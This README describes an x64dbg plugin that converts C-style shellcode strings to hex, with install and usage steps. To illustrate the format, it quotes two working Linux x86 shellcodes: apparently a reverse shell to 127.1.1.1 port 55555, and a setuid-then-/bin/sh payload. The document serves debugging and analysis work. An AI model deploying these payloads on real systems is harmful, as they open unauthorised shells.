# xshellex
With xshellex you can paste any kind of c-shellcode strings in x64dbg. Also you can convert clipboard "x64dbg-binary-copy" to c-shellcode string.

x64dbg plugin to support shellex c-shellcode converter to HEX:
* https://github.com/David-Reguera-Garcia-Dreg/shellex

## Install

Just download https://github.com/David-Reguera-Garcia-Dreg/xshellex/releases/download/r0.1b/xshellex01b.zip

Extract the .zip in the x64dbg folder:

Now check if you have installed:
* x64dbg\release\tcc
* x64dbg\release\shellex.exe
* x64dbg\release\x32\plugins\xshellex.dp32
* x64dbg\release\x64\plugins\xshellex.dp64

## Use

Go to Plugins --> xshellex --> launch

Paste your c-shellcode string

Press enter

Press Control+Z

Copy the output to clipboard

![Alt text](launch.png)

Use x64dbg Binary Paste (right click in disasm)

![Alt text](binary_paste.png)

## Converting clipboard "x64dbg-binary-copy" to c-shellcode string

Select area

Right click --> Binary ---> Copy

![Alt text](binary_copy.png)

Go to Plugins --> xshellex --> clipboard to ....

![Alt text](clipboard_to_shellcode.png)

## Why this plugin?

In real world yummyPaste plugin cant works fine, because you have a lot of garbage to filter, just check shellcodes like

http://shell-storm.org/shellcode/files/shellcode-833.php
```
unsigned char code[] = \

"\x68"
"\x7f\x01\x01\x01"  // <- IP Number "127.1.1.1"
"\x5e\x66\x68"
"\xd9\x03"          // <- Port Number "55555"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\xeb\xce";
```

https://www.exploit-db.com/exploits/13359
```
char sc[] = /* 7 + 23 = 30 bytes */
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";
```
